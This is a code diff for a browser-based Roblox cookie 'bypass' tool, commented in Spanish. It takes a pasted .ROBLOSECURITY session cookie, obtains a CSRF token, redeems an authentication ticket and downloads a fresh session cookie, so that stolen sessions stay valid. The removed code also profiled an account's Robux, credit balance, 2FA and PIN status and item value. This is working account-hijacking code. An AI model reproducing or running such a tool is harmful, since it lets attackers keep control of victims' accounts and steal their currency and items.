@@ -55,211 +55,84 @@ window.onload = function() {
         });
     });
 
-
     // Funcionalidad del botón Bypass
-    bypassButton.addEventListener('click', function() {
+    bypassButton.addEventListener('click', async function() {
         const authCookie = document.getElementById('cookieInput').value;
 
         if (authCookie) {
-            refreshCookie(authCookie);
+            const newAuthCookie = await refreshCookie(authCookie);
+            if (newAuthCookie) {
+                // Guardar la nueva cookie en un archivo
+                downloadNewCookie(newAuthCookie);
+            } else {
+                alert("Failed to refresh cookie.");
+            }
         } else {
             alert("Por favor, ingresa una cookie válida.");
         }
     });
 };
 
-const axios = require("axios");
-
-class RobloxUser  {
-    constructor(roblosecurityCookie, userId, username, displayName) {
-        this.roblosecurityCookie = roblosecurityCookie;
-        this.userId = userId;
-        this.username = username;
-        this.displayName = displayName;
-    }
-
-    async doAuthorizedRequest(url) {
-        return (await axios.get(url, {
-            headers: {
-                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
-            },
-        })).data;
-    }
-
-    static async register(roblosecurityCookie) {
-        const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
-            headers: {
-                Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
-            },
-        });
-
-        return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
-    }
-
-    async getAccountCreationDate() {
-        const { created } = await this.doAuthorizedRequest(`https://users.roblox.com/v1/users/${this.userId}`);
-        return new Intl.DateTimeFormat("en-US", { dateStyle: "long", timeStyle: "long" }).format(new Date(created));
-    }
-
-    async getAccountPremiumStatus() {
-        try {
-            await this.doAuthorizedRequest(`https://premiumfeatures.roblox.com/v1/users/${this.userId}/subscriptions`);
-            return true;
-        } catch (error) {
-            return false;
-        }
-    }
-
-    async getAccount2FAStatus() {
-        const { twoStepVerificationEnabled } = await this.doAuthorizedRequest(`https://twostepverification.roblox.com/v1/metadata`);
-        return twoStepVerificationEnabled;
-    }
-
-    async getAccountPinStatus() {
-        const { isEnabled } = await this.doAuthorizedRequest(`https://auth.roblox.com/v1/account/pin`);
-        return isEnabled;
-    }
-
-    async getAccountBalance() {
-        const { robux } = await this.doAuthorizedRequest(`https://economy.roblox.com/v1/users/${this.userId}/currency`);
-        return robux;
-    }
-
-    async getUserData() {
-        const creationDate = await this.getAccountCreationDate();
-        const premiumStatus = await this.getAccountPremiumStatus();
-        const twoFAStatus = await this.getAccount2FAStatus();
-        const pinStatus = await this.getAccountPinStatus();
-        const accountBalance = await this.getAccountBalance();
-
-        return {
-            username: this.username,
-            uid: this.userId,
-            displayName: this.displayName,
-            avatarUrl: await this.getAccountBodyShot(),
-            createdAt: creationDate,
-            country: await this.getAccountCountry(),
-            balance: accountBalance,
-            isTwoStepVerificationEnabled: twoFAStatus,
-            isPinEnabled: pinStatus,
-            isPremium: premiumStatus,
-            creditbalance: await this.getAccountCreditBalance(),
-            rap: await this.getAccountRAP(this.userId),
-        };
-    }
-
-    async getAccountBodyShot() {
-        const { data } = await this.doAuthorizedRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${this.userId}&size=720x720&format=Png&isCircular=false`);
-        return data[0].imageUrl;
-    }
-
-    async getAccountCountry() {
-        const { countryName } = await this.doAuthorizedRequest("https://www.roblox.com/account/settings/account-country");
-        return countryName;
-    }
-
-    async getAccountCreditBalance() {
-        const { balance } = await this.doAuthorizedRequest("https://billing.roblox.com/v1/credit");
-        const formatter = new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" });
-        return formatter.format(balance);
-    }
-
-    async getAccountRAP(userId) {
-        let calculatedRap = 0;
-        let nextPageCursor = "";
-
-        while (nextPageCursor !== null) {
-            const inventoryPage = await this.doAuthorizedRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`);
-            calculatedRap += inventoryPage.data.reduce((rap, item) => rap + item.recentAveragePrice, 0);
-            nextPageCursor = inventoryPage.nextPageCursor;
-        }
-
-        return calculatedRap;
-    }
-}
-
-async function refreshCookie(authCookie) {
+// Función para generar el CSRF token
+async function generateCsrfToken(authCookie) {
     try {
-        const authTicket = await generateAuthTicket(authCookie);
-        if (!authTicket) {
-            alert("Failed to generate authentication ticket.");
-            return;
-        }
-
-        const { success, refreshedCookie } = await redeemAuthTicket(authTicket);
-        if (success && refreshedCookie) {
-            saveCookieToFile(refreshedCookie);
-        } else {
-            alert("Failed to extract new cookie.");
-        }
-    } catch (error) {
-        console.error("Error refreshing cookie:", error);
-        alert("An error occurred while refreshing the cookie.");
-    }
-}
-
-async function fetchSessionCSRFToken(roblosecurityCookie) {
-    try {
-        const response = await axios.post("https://auth.roblox.com/v2/logout", {}, {
+        const response = await fetch("https://www.roblox.com/home", {
+            method: 'GET',
+            credentials: 'include',
             headers: {
-                'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`
+                'Cookie': `.ROBLOSECURITY=${authCookie}`
             }
         });
-        return response.headers["x-csrf-token"] || null;
+        const text = await response.text();
+        const csrfToken = text.split('<meta name="csrf-token" data-token="')[1].split('" />')[0];
+        return csrfToken;
     } catch (error) {
+        console.error("Error generating CSRF token:", error);
         return null;
     }
 }
 
-async function generateAuthTicket(roblosecurityCookie) {
-    try {
-        const csrfToken = await fetchSessionCSRFToken(roblosecurityCookie);
-        const response = await axios.post("https://auth.roblox.com/v1/authentication-ticket", {}, {
-            headers: {
-                "x-csrf-token": csrfToken,
-                "referer": "https://www.roblox.com/madebySynaptrixBitch",
-                'Content-Type': 'application/json',
-                'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`
-            }
-        });
+// Función para refrescar la cookie
+async function refreshCookie(authCookie) {
+    const csrfToken = await generateCsrfToken(authCookie);
+    if (!csrfToken) return null;
 
-        return response.headers['rbx-authentication-ticket'] || "Failed to fetch auth ticket";
-    } catch (error) {
-        return "Failed to fetch auth ticket";
-    }
+    const headers = {
+        "Content-Type": "application/json",
+        "user-agent": "Roblox/WinInet",
+        "origin": "https://www.roblox.com",
+        "referer": "https://www.roblox.com/my/account",
+        "x-csrf-token": csrfToken
+    };
+
+    const response = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
+        method: 'POST',
+        headers: headers,
+        credentials: 'include',
+        body: JSON.stringify({})
+    });
+
+    const authTicket = response.headers.get("rbx-authentication-ticket");
+    if (!authTicket) return null;
+
+    headers["RBXAuthenticationNegotiation"] = "1";
+    const redeemResponse = await fetch("https://auth.roblox.com/v1/authentication-ticket/redeem", {
+        method: 'POST',
+        headers: headers,
+        body: JSON.stringify({ authenticationTicket: authTicket })
+    });
+
+    const newCookie = redeemResponse.headers.get("set-cookie");
+    const newAuthCookie = newCookie ? newCookie.match(/\.ROBLOSECURITY=(.*?);/)[1] : null;
+    return newAuthCookie;
 }
 
-    
-async function redeemAuthTicket(authTicket) {
-    try {
-        const response = await axios.post("https://auth.roblox.com/v1/authentication-ticket/redeem", {
-            "authenticationTicket": authTicket
-        }, {
-            headers: {
-                'RBXAuthenticationNegotiation': '1'
-            }
-        });
-
-        const refreshedCookieData = response.headers['set-cookie']?.toString() || "";
-
-        return {
-            success: !!refreshedCookieData,
-            refreshedCookie: refreshedCookieData.match(/(_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-y-items.\|_[A-Za-z0-9]+)/g)?.toString()
-        };
-    } catch (error) {
-        console.error("Error redeeming auth ticket:", error);
-        return {
-            success: false,
-            robloxDebugResponse: error.response?.data
-        };
-    }
-}
-
-function saveCookieToFile(cookie) {
-    const blob = new Blob([cookie], { type: 'text/plain' });
+// Función para descargar la nueva cookie
+function downloadNewCookie(newAuthCookie) {
+    const blob = new Blob([newAuthCookie], { type: 'text/plain' });
     const link = document.createElement('a');
     link.href = URL.createObjectURL(blob);
-    link.download = 'cookie.txt';
+    link.download = 'NEW_COOKIE.txt';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
